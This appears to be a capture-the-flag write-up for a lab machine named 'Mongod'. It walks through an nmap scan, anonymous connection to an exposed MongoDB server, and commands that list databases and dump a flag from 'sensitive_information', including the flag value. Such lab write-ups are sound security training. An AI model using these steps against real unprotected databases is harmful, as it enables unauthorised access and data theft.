# Mongod

# TL;DR

- Simple machine running the MongoDB server that allows anonymous user login. We are able to connect to the server using the `mongodb` utility.

# Enumeration

- `ping 10.129.166.53` : to test if the server us up and running.
- We scan the host to determine running services:
```
nmap -p- --min-rate=1000 -sV 10.129.166.53
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-01 19:36 PST
Nmap scan report for 10.129.166.53
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.43 seconds

```
- From the scan we find the following service running:
    - `ssh` on port`22/tcp`
    - `mongod` on port `27017/tcp` 

# Foothold

 - Since there are only two ports open we can start with the interesting one, the port running MongoDB service.
 - We can run `curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz` to download the `mongodb` utility, if it does not already exist on the local host.
 - We can extract the contents of the tar archive file using the `tar` utility: `tar xvf mongodb-linux-x86_64-3.4.7.tgz`
 - Next we need to navigate to the location where the `mongo` binary is present: `cd mongodb-linux-x86_64-3.4.7/bin`
 - We can then use the binary to connect to the MongoDB server: `./mongo mongodb://10.129.166.53:27017`
 - Once connected to the host we can run the following commands to retrieve the flag (Note: MongoDB is designed in the following way: `Database->Collection->Document`):
    - To show all the databases on the server:
        ```
        > show dbs
        admin                  0.000GB
        config                 0.000GB
        local                  0.000GB
        sensitive_information  0.000GB
        users                  0.000GB
        ```
    - To use the database we deem interesting:
        ```
        > use sensitive_information;
        switched to db sensitive_information
        ```
    - Once we are using the specified database we can list all the collections in that database:
        ```
        > show collections;
        flag
        ```
    - To print the contents of a particular document in the collection:
        ```
        > db.flag.find().pretty();
        {
                "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
                "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
        }
        ```